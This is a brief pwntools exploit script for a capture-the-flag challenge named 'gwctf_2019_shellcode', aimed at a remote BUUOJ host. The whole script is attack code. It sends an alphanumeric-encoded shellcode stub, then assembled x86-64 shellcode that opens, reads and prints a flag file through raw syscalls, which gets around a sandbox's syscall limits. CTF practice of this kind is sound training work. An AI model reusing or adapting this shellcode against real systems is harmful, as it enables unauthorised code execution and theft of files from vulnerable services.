from pwn import *
import pwnlib.shellcraft as sc
# p = process("./gwctf_2019_shellcode")
p = remote('node4.buuoj.cn', '26865')

context.arch = 'amd64'
shellcode = '''
push 0x6761
pop rax
shl rax,32
or rax,0x6c662f2e
push rax
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,2
syscall
mov rax,0
mov rdi,3
mov rsi,rbp
mov rdx,100
syscall
mov rax,1
mov rdi,1
mov rdx,100
syscall
pop rax
ret
'''
p.sendline('Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M152x3e0z3a3E2M114E1O3x3y2m7K5k7n04344z3w'.ljust(100, '\x00') + asm(shellcode))

p.interactive()
